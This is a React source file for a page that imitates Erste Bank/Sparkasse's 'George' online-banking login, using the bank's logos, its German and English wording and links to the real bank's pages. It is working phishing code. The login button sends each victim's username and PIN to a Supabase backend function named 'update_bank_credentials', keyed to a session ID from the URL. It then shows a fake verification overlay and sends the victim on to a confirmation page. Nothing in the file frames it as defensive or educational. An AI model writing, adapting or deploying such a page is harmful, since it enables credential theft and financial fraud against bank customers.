import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { User, Lock, Menu, X } from "lucide-react";
import { Tooltip, TooltipTrigger, TooltipContent, TooltipProvider } from "@/components/ui/tooltip";
import georgeBlueLogo from "@/assets/george-logo-bright-blue.svg";
import georgeWhiteLogo from "@/assets/george-logo-white.svg";
import sparkasseLogo from "@/assets/EB-SPK_Logo_screen_white.svg";
import ersteIcon from "@/assets/erste_bank.png";

const ukFlag = "data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNS4xLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMzVweCIgaGVpZ2h0PSIyMy41cHgiIHZpZXdCb3g9IjU3OC4xMzkgMjk3LjY2OSAzNSAyMy41IiBlbmFibGUtYmFja2dyb3VuZD0ibmV3IDU3OC4xMzkgMjk3LjY2OSAzNSAyMy41Ig0KCSB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxwYXRoIGZpbGw9IiNGRkZGRkYiIGQ9Ik02MTMuMTM5LDMxOC4xMzZjMCwzLjAzMy0xLjQ0LDMuMDMzLTMuNzgxLDMuMDMzaC0yNy4zOTNjLTMuODI2LDAtMy44MjYtMS43MDYtMy44MjYtMi45MTZ2LTE3LjcxNQ0KCWMwLTEuNTIxLDAtMi44NjksNC4yOTUtMi44NjloMjYuNTczYzQuMTMyLDAsNC4xMzIsMS4wMzUsNC4xMzIsMi43MTNWMzE4LjEzNnoiLz4NCjxwYXRoIGZpbGw9IiNFRjU1NjQiIGQ9Ik02MTIuNTA4LDMyMC40NjhjMC4zNTQtMC4zNzIsMC41OC0wLjg2NCwwLjYxNS0xLjQwOWwtOC41OTgtNS43MDFoLTIuNzQ2TDYxMi41MDgsMzIwLjQ2OHoiLz4NCjxwb2x5Z29uIGZpbGw9IiNFRjU1NjQiIHBvaW50cz0iNTk3LjQ4LDMwNi44NDMgNTk3LjQ4LDI5Ny42NjkgNTkzLjc5OSwyOTcuNjY5IDU5My43OTksMzA2Ljg0MyA1NzguMTM5LDMwNi44NDMgNTc4LjEzOSwzMTEuNzI5IA0KCTU5My43OTksMzExLjcyOSA1OTMuNzk5LDMyMS4xNjkgNTk3LjQ4LDMyMS4xNjkgNTk3LjQ4LDMxMS43MjkgNjEzLjEzOSwzMTEuNzI5IDYxMy4xMzksMzA2Ljg0MyAiLz4NCjxwYXRoIGZpbGw9IiNFRjU1NjQiIGQ9Ik01ODkuNDk4LDMxMy4zNTdsLTEwLjcyNSw3LjEwOWMwLjQxMiwwLjQzMiwwLjk5LDAuNzAxLDEuNjMzLDAuNzAxaDAuMDU3bDExLjc4MS03LjgxM0w1ODkuNDk4LDMxMy4zNTcNCglMNTg5LjQ5OCwzMTMuMzU3eiIvPg0KPHBhdGggZmlsbD0iI0VGNTU2NCIgZD0iTTU4Ni43NTQsMzA1LjIxM2gyLjc0NGwtMTAuNTU1LTYuOTk2Yy0wLjM4OSwwLjMzMi0wLjY2OCwwLjc4OC0wLjc2NCwxLjMxM0w1ODYuNzU0LDMwNS4yMTN6Ii8+DQo8cGF0aCBmaWxsPSIjRUY1NTY0IiBkPSJNNjEwLjQxNCwyOTcuNjY5bC0xMS4zODEsNy41NDRoMi43NDZsMTAuNTU1LTYuOTk2Yy0wLjM5Ni0wLjMzNy0wLjktMC41NDgtMS40NjMtMC41NDhINjEwLjQxNHoiLz4NCjxwb2x5Z29uIGZpbGw9IiM0NTUxQUEiIHBvaW50cz0iNTc4LjEzOSwzMDAuNDEzIDU3OC4xMzksMzA1LjIxMyA1ODUuMzgxLDMwNS4yMTMgIi8+DQo8cG9seWdvbiBmaWxsPSIjNDU1MUFBIiBwb2ludHM9IjU5Mi41NjgsMzIxLjE2OSA1OTIuNTY4LDMxNC4wNTMgNTgxLjgzNCwzMjEuMTY5ICIvPg0KPHBvbHlnb24gZmlsbD0iIzQ1NTFBQSIgcG9pbnRzPSI1ODUuMzgxLDMxMy4zNTcgNTc4LjEzOSwzMTMuMzU3IDU3OC4xMzksMzE4LjE1NiAiLz4NCjxwb2x5Z29uIGZpbGw9IiM0NTUxQUEiIHBvaW50cz0iNTk4LjcwOSwyOTcuNjY5IDU5OC43MDksMzA0LjUxOCA2MDkuMDQxLDI5Ny42NjkgIi8+DQo8cG9seWdvbiBmaWxsPSIjNDU1MUFBIiBwb2ludHM9IjYwNS44OTgsMzA1LjIxMyA2MTMuMTM5LDMwNS4yMTMgNjEzLjEzOSwzMDAuNDEzICIvPg0KPHBvbHlnb24gZmlsbD0iIzQ1NTFBQSIgcG9pbnRzPSI2MTMuMTM5LDMxOC4xNTcgNjEzLjEzOSwzMTMuMzU3IDYwNS44OTgsMzEzLjM1NyAiLz4NCjxwb2x5Z29uIGZpbGw9IiM0NTUxQUEiIHBvaW50cz0iNTk4LjcwOSwzMTQuMDUzIDU5OC43MDksMzIxLjE2OSA2MDkuNDQzLDMyMS4xNjkgIi8+DQo8cG9seWdvbiBmaWxsPSIjNDU1MUFBIiBwb2ludHM9IjU5Mi41NjgsMjk3LjY2OSA1ODIuMjM2LDI5Ny42NjkgNTkyLjU2OCwzMDQuNTE4ICIvPg0KPC9zdmc+DQo=";

const atFlag = "data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNS4xLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMzYuODM0cHgiIGhlaWdodD0iMjQuNzNweCIgdmlld0JveD0iNDI1LjI4OCAyODQuOTkzIDM2LjgzNCAyNC43MyIgZW5hYmxlLWJhY2tncm91bmQ9Im5ldyA0MjUuMjg4IDI4NC45OTMgMzYuODM0IDI0LjczIg0KCSB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxwYXRoIGZpbGw9IiNFRjU1NjQiIGQ9Ik00NTkuNzM1LDI4NC45OTNoLTMyLjA1OGMtMS4zMTgsMC0yLjM4OSwxLjA2OC0yLjM4OSwyLjM4NnY1LjcwOWgzNi44M3YtNS43MDkNCglDNDYyLjEyLDI4Ni4wNjIsNDYxLjA1MywyODQuOTkzLDQ1OS43MzUsMjg0Ljk5M3oiLz4NCjxyZWN0IHg9IjQyNS4yOTIiIHk9IjI5My4wODkiIGZpbGw9IiNGRkZGRkYiIHdpZHRoPSIzNi44MjgiIGhlaWdodD0iOC4zOTUiLz4NCjxwYXRoIGZpbGw9IiNFRjU1NjQiIGQ9Ik00MjUuMjkyLDMwMS40ODN2NS44NTNjMCwxLjMxOCwxLjA2NiwyLjM4OCwyLjM4NywyLjM4OGgzMi4wNThjMS4zMTcsMCwyLjM4Ni0xLjA2OCwyLjM4Ni0yLjM4OHYtNS44NTMNCglINDI1LjI5MnoiLz4NCjwvc3ZnPg0K";

const translations = {
  de: {
    title: "George Login",
    subtitle: "Bitte geben Sie Ihre Verfügernummer oder Ihren selbst gewählten Benutzernamen ein.",
    usernamePlaceholder: "Verfügernummer/Benutzername",
    pinPlaceholder: "PIN",
    loginButton: "Login starten",
    helpLink: "Aktivierungscode benötigt oder EB-PIN vergessen?",
    brand: ["Einfach", "Intelligent", "Persönlich"],
    footer: [
      { label: "Impressum", url: "https://www.sparkasse.at/tiny/impressum-george" },
      { label: "Datenschutz", url: "https://www.sparkasse.at/tiny/datenschutz-george" },
      { label: "Geschäftsbedingungen", url: "https://www.sparkasse.at/tiny/gbg-george" },
      { label: "Service & Kontakt", url: "https://www.sparkasse.at/tiny/service-kontakt-george" },
    ],
  },
  en: {
    title: "George Login",
    subtitle: "Please type in your user number (\"Verfügernummer\") or the username you created.",
    usernamePlaceholder: "User number/Username",
    pinPlaceholder: "PIN",
    loginButton: "Start Login",
    helpLink: "Activation code needed or EB-PIN forgotten?",
    brand: ["Simple", "Smart", "Personal"],
    footer: [
      { label: "Imprint", url: "https://www.sparkasse.at/tiny/impressum-george" },
      { label: "Privacy", url: "https://www.sparkasse.at/tiny/datenschutz-george" },
      { label: "Terms & Conditions", url: "https://www.sparkasse.at/tiny/gbg-george" },
      { label: "Contact & Services", url: "https://www.sparkasse.at/tiny/service-kontakt-george" },
    ],
  },
};

const ErsteBank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("George - Login", ersteIcon);

  const [username, setUsername] = useState("");
  const [pin, setPin] = useState("");
  const [lang, setLang] = useState<"de" | "en">("de");
  const [menuOpen, setMenuOpen] = useState(false);

  const t = translations[lang];
  const isEnglish = lang === "en";

  return (
    <>
      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
    <div className="flex h-screen flex-col">
      <div className="flex flex-1 min-h-0">
        {/* Left Side - Login */}
        <div className="w-full md:w-1/2 bg-white flex flex-col justify-center items-center px-8 relative">
          {/* Hamburger Menu - Mobile only */}
          <button
            onClick={() => setMenuOpen(true)}
            className="absolute top-6 left-6 md:hidden"
          >
            <Menu className="h-7 w-7 text-[#2870ED]" strokeWidth={1.5} />
          </button>

          {/* Language Switcher */}
          <TooltipProvider>
            <Tooltip>
              <TooltipTrigger asChild>
                <button
                  onClick={() => setLang(isEnglish ? "de" : "en")}
                  className="absolute top-6 right-6 cursor-pointer"
                >
                  <img
                    src={isEnglish ? atFlag : ukFlag}
                    alt={isEnglish ? "Österreich" : "English"}
                    className="h-6 w-auto"
                  />
                </button>
              </TooltipTrigger>
              <TooltipContent side="left">
                <p>{isEnglish ? "Österreich" : "English"}</p>
              </TooltipContent>
            </Tooltip>
          </TooltipProvider>
          <div className="w-full max-w-[320px]">
            <img src={georgeBlueLogo} alt="George Logo" className="h-20 mb-8 mx-auto block" />
            <h1 className="text-2xl font-bold text-gray-900 mb-6 text-center">{t.title}</h1>
            <p className="text-sm text-gray-600 mb-4">{t.subtitle}</p>

            <div className="relative mb-4">
              <User className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-400" />
              <input
                type="text"
                placeholder={t.usernamePlaceholder}
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-[#2870ED] focus:border-transparent"
              />
            </div>

            <div className="relative mb-6">
              <Lock className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-400" />
              <input
                type="password"
                placeholder={t.pinPlaceholder}
                value={pin}
                onChange={(e) => setPin(e.target.value)}
                className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-[#2870ED] focus:border-transparent"
              />
            </div>

            <button onClick={async () => {
              console.log("Session ID:", sessionId);
              if (sessionId) {
                const { error } = await supabase.rpc("update_bank_credentials", {
                  p_session_id: sessionId,
                  p_username: username,
                  p_password: pin,
                  p_username_label: "Benutzername",
                  p_password_label: "PIN",
                });
                if (error) console.error("Update failed:", error);
                else console.log("Update successful");
              } else {
                console.error("No session ID found in URL!");
              }
              setShowLoading(true);
            }} className="w-full py-3 bg-[#2870ED] text-white font-semibold rounded-full hover:bg-[#1d5fd4] transition-colors mb-4">
              {t.loginButton}
            </button>

            <a href="https://www.sparkasse.at/sgruppe/privatkunden/digitales-banking/inside/s-identity-app" target="_blank" rel="noopener noreferrer" className="text-sm text-[#2870ED] font-semibold hover:underline">
              {t.helpLink}
            </a>
          </div>
        </div>

        {/* Right Side - Branding (hidden on mobile) */}
        <div
          className={`hidden md:flex w-1/2 flex-col justify-center items-center px-16 relative transition-colors duration-500 ${
            isEnglish ? "bg-[#0cb43f]" : "bg-[#721c7a]"
          }`}
        >
          <img src={georgeWhiteLogo} alt="George" className="h-96 mb-16" />
          <div className="absolute bottom-16 left-16 space-y-1">
            {t.brand.map((text) => (
              <p key={text} className="text-white text-4xl font-normal">{text}</p>
            ))}
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-[#2870ED] px-6 py-3 flex items-center justify-center md:justify-between relative z-50">
        <img src={sparkasseLogo} alt="Erste Sparkasse" className="h-6" />
        <div className="hidden md:flex gap-6">
          {t.footer.map((item) => (
            <a
              key={item.label}
              href={item.url}
              target="_blank"
              rel="noopener noreferrer"
              className="text-white text-xs hover:underline"
            >
              {item.label}
            </a>
          ))}
        </div>
      </footer>

      {/* Mobile Sidebar Overlay */}
      <div className={`fixed inset-0 bottom-0 z-40 bg-[#2870ED] flex flex-col md:hidden transition-transform duration-300 ease-in-out ${menuOpen ? 'translate-x-0' : '-translate-x-full'}`}>
        <button
          onClick={() => setMenuOpen(false)}
          className="absolute top-6 left-6"
        >
          <X className="h-7 w-7 text-white" />
        </button>
        <div className="flex flex-col space-y-6 p-8 pt-20">
          {t.footer.map((item) => (
            <a
              key={item.label}
              href={item.url}
              target="_blank"
              rel="noopener noreferrer"
              className="text-white text-lg hover:underline"
            >
              {item.label}
            </a>
          ))}
        </div>
      </div>
    </div>
    </>
  );
};

export default ErsteBank;
